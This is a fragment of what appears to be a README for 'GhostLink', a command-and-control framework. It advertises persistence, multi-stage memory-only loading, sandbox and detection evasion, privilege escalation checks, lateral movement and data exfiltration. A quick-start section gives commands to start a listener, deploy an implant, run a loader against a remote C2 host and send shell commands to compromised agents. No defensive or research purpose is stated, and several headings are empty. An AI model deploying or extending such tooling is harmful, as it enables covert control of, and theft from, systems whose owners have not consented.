      • Linux: Crontab, systemd services, rc.local

  2️⃣  MULTI-STAGE LOADING (3-Stage Architecture)
      • Stage 1: Lightweight loader (~1 KB)
      • Stage 2: Encrypted stager (~50 KB)  
      • Stage 3: Full-featured agent (~200 KB)
      • Memory-only execution capability

  3️⃣  ADVANCED ENCODING SCHEMES

  4️⃣  COMPREHENSIVE EVASION TECHNIQUES
      • Random User-Agent rotation per request
      • Randomized beacon intervals (±3 seconds)
      • Sandbox/VM environment detection
      • Output truncation (avoid suspicion)
      • Pattern randomization (detection evasion)

  5️⃣  PRIVILEGE ESCALATION DETECTION
      • Sudo privileges checking
      • Vulnerable kernel detection (CVEs)
      • Windows UAC bypass identification

  6️⃣  LATERAL MOVEMENT TOOLS

      • User enumeration

  7️⃣  DATA EXFILTRATION CAPABILITIES

🚀 QUICK START:

1. INSTALL DEPENDENCIES
   $ pip install -r requirements.txt

2. START C2 SERVER
   $ python3 Listener.py
   # Listens on 0.0.0.0:8888

3. DEPLOY AGENT
   $ python3 Implant.py
   # Or use multi-stage loader:
   $ python3 loader.py http://c2-server:8888

4. CONTROL AGENTS
   $ python3 Controller.py
   GhostLink> agents
   GhostLink> send Agent_01 "whoami"
   GhostLink> interact Agent_01
